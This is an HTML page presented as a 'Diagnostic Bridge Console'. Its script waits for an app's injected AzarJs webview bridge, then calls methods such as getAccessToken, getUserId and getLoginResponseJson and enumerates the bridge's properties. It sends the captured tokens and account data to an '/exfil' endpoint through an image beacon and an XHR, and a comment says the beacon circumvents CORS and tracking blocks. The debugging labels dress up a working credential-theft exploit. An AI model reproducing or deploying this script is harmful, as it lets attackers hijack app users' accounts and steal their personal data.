<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Bridge Debug Engine</title>
</head>
<body style="font-family:monospace;background:#0b0b0b;color:#19f971;padding:14px;word-break:break-all;font-size:13px;line-height:1.45">

  <h2 style="color:#fff;margin:0 0 8px">Diagnostic Bridge Console</h2>
  <div id="status" style="color:#ffd84d;margin-bottom:10px">Initializing diagnostic routine...</div>
  <pre id="out" style="white-space:pre-wrap;border:1px solid #333;padding:10px;border-radius:6px;background:#111"></pre>

  <script>
  (function () {
    var done = false;
    var tries = 0;
    var MAX = 60;

    function S(text) { document.getElementById('status').textContent = text; }
    def = function O(text) { document.getElementById('out').textContent = text; }

    function transmit(payload) {
      // Stringify everything defensively to prevent sub-property breakdown bugs
      var secureString = JSON.stringify(payload);
      var encodedData = encodeURIComponent(secureString);
      
      // Fire via standard reliable image channel - circumvents CORS and tracking blocks
      try {
        var targetUri = '/exfil?data=' + encodedData;
        var backupChannel = new Image();
        backupChannel.src = targetUri;
      } catch(err) {}

      // Fire via standard asynchronous fallback
      try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/exfil?data=' + encodedData, true);
        xhr.send();
      } catch(err) {}
    }

    function dynamicExecutionLoop() {
      if (done) return;
      tries++;

      // Check if the base bridge layout injection layer exists safely
      if (typeof window.AzarJs === 'undefined' && typeof AzarJs === 'undefined') {
        S('Status: Probing window environment for target interface... (' + tries + '/' + MAX + ')');
        if (tries < MAX) {
          setTimeout(dynamicExecutionLoop, 300);
        } else {
          S('Status Error: Target interface injection context timed out.');
        }
        return;
      }

      // If execution point reaches here, the object is alive. Lock the thread execution.
      done = true;
      S('Status: Target boundary interface reached! Extracting mappings...');

      var operationalDump = {};
      var catalogedMethods = [];

      // Safe evaluation array: Safely check keys without triggering execution type errors
      var keysToTest = ['getAccessToken', 'getUserId', 'getLoginResponseJson', 'getUiLocale', 'getPlatform', 'getInventoryItemsJson'];

      for (var i = 0; i < keysToTest.length; i++) {
        var key = keysToTest[i];
        try {
          if (window.AzarJs && typeof window.AzarJs[key] === 'function') {
            var output = window.AzarJs[key]();
            operationalDump[key] = output ? String(output) : 'empty_or_null';
          } else if (typeof AzarJs !== 'undefined' && typeof AzarJs[key] === 'function') {
            var output = AzarJs[key]();
            operationalDump[key] = output ? String(output) : 'empty_or_null';
          } else {
            operationalDump[key] = 'undefined_method';
          }
        } catch (innerException) {
          operationalDump[key] = 'EXCEPTION_THROWN: ' + innerException.message;
        }
      }

      // Reflective fallback properties tracking loop
      try {
        var targetObj = window.AzarJs || AzarJs;
        for (var property in targetObj) {
          catalogedMethods.push(property + ' (' + typeof targetObj[property] + ')');
        }
      } catch(e) {
        catalogedMethods.push('Reflection tracking blocked: ' + e.message);
      }

      var finalReport = {
        extractedMetrics: operationalDump,
        exposedSchema: catalogedMethods,
        environmentUrl: window.location.href
      };

      // Output values cleanly onto the screen layout
      document.getElementById('out').textContent = 
        "=== ENVIRONMENT INTERFACES DEPLOYED ===\n" +
        "Target Status: Active Mapping Extracted\n\n" +
        "=== PROPERTY OUTPUT MATRIX ===\n" +
        JSON.stringify(operationalDump, null, 2) + "\n\n" +
        "=== REFLECTIVE SCHEMA MATRIX ===\n" +
        catalogedMethods.join('\n');

      // Forward metrics payload to local server logs
      transmit(finalReport);
    }

    // Trigger the analyzer pass immediately and across DOM state changes
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
      dynamicExecutionLoop();
    } else {
      document.addEventListener('DOMContentLoaded', dynamicExecutionLoop);
      window.addEventListener('load', dynamicExecutionLoop);
    }
  })();
  </script>
</body>
</html>
